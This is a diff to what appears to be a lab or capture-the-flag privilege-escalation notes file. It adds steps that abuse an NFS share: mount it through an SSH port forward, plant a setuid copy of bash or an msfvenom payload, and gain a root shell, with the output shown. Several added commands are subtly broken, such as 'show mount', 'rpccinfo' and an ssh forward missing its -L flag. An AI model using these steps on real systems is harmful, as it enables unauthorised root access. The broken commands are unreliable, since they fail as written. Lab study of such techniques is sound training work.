@@ -491,6 +491,10 @@ sudo su
 mkdir /tmp/nfs
 mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
 ````
+- Alternative command
+````
+mount -t nfs -v 10.10.185.59:/home/james /tmp/nfs
+````
 - Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
 ````
 msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
@@ -502,6 +506,47 @@ chmod +xs /tmp/nfs/shell.elf
 - Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
 ````
 /tmp/shell.elf
+````
+#### NFS Errors
+- When we try to mount with the alternative command above, we fail to get any response and connection times out.
+- To double check use the command:
+````
+show mount -e 10.10.185.59
+clnt_create: RPC: Unable to recieve
+````
+- Means there is a share on the host but only reachable on the remote machine locally.
+- Can forward the port on our machine to the target machine
+- Need to check the ports on the target with:
+````
+rpccinfo -p
+100005    3   udp  20048  mountd
+    100005    3   tcp  20048  mountd
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100227    3   tcp   2049  nfs_acl
+````
+- Confirms nfs is running on 2049 the default port
+- Now port forward:
+````
+ssh targetusername@10.10.185.59 -i id_rsa 2049:localhost:2049
+````
+- When a shell on the remote machine authenticates we are successful
+- Now create the mount with elevated permissions
+````
+sudo mkdir /tmp/nfs
+sudo mount -v -t nfs localhost:/home/james /tmp/nfs
+````
+- Now to get to root
+- On your attackbox run
+````
+cp /bin/bash /tmp/nfs
+chmod +s bash
+````
+- Now on the target box as your non elevated user
+````
+./bash -p
+id
+uid=1000(james) gid=1000(james) euid=0(root) egid=0(root)
 ````
 ### Service Exploits
 - https://www.exploit-db.com/exploits/1518
